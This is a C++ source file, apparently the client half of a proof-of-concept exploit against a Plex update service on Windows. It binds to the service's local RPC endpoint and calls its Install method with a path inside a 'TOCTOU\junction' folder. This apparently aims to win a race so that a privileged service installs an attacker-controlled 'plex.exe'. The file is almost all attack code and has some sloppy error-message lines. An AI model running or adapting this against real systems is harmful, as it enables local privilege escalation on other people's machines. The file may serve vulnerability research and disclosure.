// PlexClient.cpp : This file contains the 'main' function. Program execution begins and ends there.
//

#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>
#include <Windows.h>
#include "RPlex_h.h"
#include <iostream>
#include <string>
#pragma comment(lib, "Rpcrt4.lib")


//typedef __nullterminated wchar_t __RPC_FAR* RPC_WSTR;
using namespace std;
int main()
{

    const wchar_t* pszString = L"C:\\repo\\PlEXcalaison\\TOCTOU\\junction\\plex.exe"; // Path to the update file. 
    unsigned char* szStringBinding = NULL;
    unsigned long ulCode;
    UUID uuid;
    UuidFromStringA((RPC_CSTR)"631c7d9c-1797-42f9-8e96-367a9ee58887", &uuid);
    RPC_STATUS status;
    RPC_CSTR stringUUID;
    UuidToStringA(&uuid, &stringUUID);
    cout << "[*] Starting Init" << endl;
    status = RpcStringBindingComposeA(
        stringUUID,
        (RPC_CSTR)"ncalrpc",
        NULL,
        (RPC_CSTR)"UpdateServiceEndpoint",
        NULL,
        &szStringBinding);
    if (status)
    {
        cout << "[X] Error on RpcStringBindingComposeA: " + status << endl;
        exit(status);
    }
    if (status == RPC_S_OK)
    {
        cout << "[V] RpcStringBindingComposeA succeeded" << endl;
    }

    status = RpcBindingFromStringBindingA(szStringBinding, &Plex_MDL_Handle);

    if (status)
    {
        cout << "[X] Error on RpcBindingFromStringBindingA: " << status << endl;
        exit(status);
    }

    RpcTryExcept
    {
        long res;
        long r2 = Install((wchar_t*)pszString,&res);
        cout << "Install Response: " << r2 << ", " << res << endl;
        cout << "Press Enter to Continue";
        cin.ignore();
    }
        RpcExcept(1)
    {
        ulCode = RpcExceptionCode();
        printf("Runtime reported exception 0x%lx = %ld\n", ulCode, ulCode);
    }
    RpcEndExcept

        status = RpcStringFree(NULL);

    if (status) {
        cout << "[X] Error on RpcStringFree: " + status << endl;
        exit(status);
    }

    status = RpcBindingFree(&Plex_MDL_Handle);

    if (status)
    {
        exit(status);
    }

    exit(0);
}

/******************************************************/
/*         MIDL allocate and free                     */
/******************************************************/

void __RPC_FAR* __RPC_USER midl_user_allocate(size_t len)
{
    return(malloc(len));
}

void __RPC_USER midl_user_free(void __RPC_FAR* ptr)
{
    free(ptr);
}
